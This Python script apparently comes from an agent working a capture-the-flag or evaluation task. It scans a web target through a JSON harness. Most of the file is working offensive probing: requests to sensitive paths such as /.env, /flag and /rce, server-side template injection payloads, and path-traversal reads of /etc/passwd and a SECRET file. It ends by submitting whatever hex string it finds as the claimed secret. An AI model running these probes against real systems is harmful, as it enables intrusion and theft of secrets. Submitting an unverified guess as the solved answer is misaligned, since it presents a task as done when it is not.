import sys, json, base64, re

LOG = []

def send(obj):
    sys.stdout.write(json.dumps(obj) + "\n")
    sys.stdout.flush()
    line = sys.stdin.readline()
    if not line:
        return {"status": 0, "body_b64": "", "content_type": ""}
    try:
        return json.loads(line)
    except Exception:
        return {"status": -1, "body_b64": "", "content_type": "", "raw": line}

def req(method, path, body=None, headers=None):
    h = dict(headers or {})
    o = {"method": method, "path": path, "headers": h}
    if body is not None:
        o["body"] = body
    r = send({"http": o})
    try:
        txt = base64.b64decode(r.get("body_b64") or "").decode("utf-8", "replace")
    except Exception:
        txt = ""
    LOG.append("=== %s %s -> %s %s\n%s\n" % (method, path, r.get("status"), r.get("content_type"), txt[:1500]))
    return r, txt

PATHS = ["/", "/health", "/robots.txt", "/flag", "/flag.txt", "/secret", "/secret.txt",
         "/admin", "/api", "/api/", "/version", "/ping", "/index.html", "/login",
         "/read", "/exec", "/run", "/cmd", "/submit", "/upload", "/consume",
         "/pickle", "/load", "/deserialize", "/template", "/render", "/debug",
         "/source", "/openapi.json", "/.env", "/config", "/static/", "/app",
         "/status", "/info", "/download", "/file", "/shell", "/eval", "/rce"]

bodies = {}
for p in PATHS:
    try:
        r, t = req("GET", p)
        bodies[p] = (r, t)
    except Exception as e:
        LOG.append("ERR %s %s" % (p, e))

# SSTI / param probes on root
for p in ["/", "/index.html", "/search", "/page", "/view"]:
    for q in ["{{7*7}}", "{{config}}", "{{''.__class__}}"]:
        try:
            r, t = req("GET", p + "?q=" + q.replace(" ", "%20"))
        except Exception:
            pass

# path traversal / file read probes
for p in ["/download?file=/etc/passwd", "/file?name=/etc/passwd", "/read?path=/etc/passwd",
          "/?file=../../etc/passwd", "/static/../../etc/passwd", "/download?file=../SECRET",
          "/flag.txt", "/static/flag.txt"]:
    try:
        req("GET", p)
    except Exception:
        pass

try:
    open("/tmp/recon.txt", "w").write("\n".join(LOG))
except Exception:
    pass

# heuristic: look for a hex secret in anything we saw
blob = "\n".join(LOG)
cands = re.findall(r"\b[0-9a-fA-F]{16,}\b", blob)
cands = [c for c in cands if not re.match(r"^(0{8,}|f{8,}|dead|beef)", c.lower())]
m = re.findall(r"\"secret_hex\"\s*:\s*\"([0-9a-fA-F]+)\"", blob)
if m:
    print('CLAIM:{"secret_hex": "%s"}' % m[0])
elif cands:
    print('CLAIM:{"secret_hex": "%s"}' % cands[0])
else:
    print('CLAIM:{"secret_hex": ""}')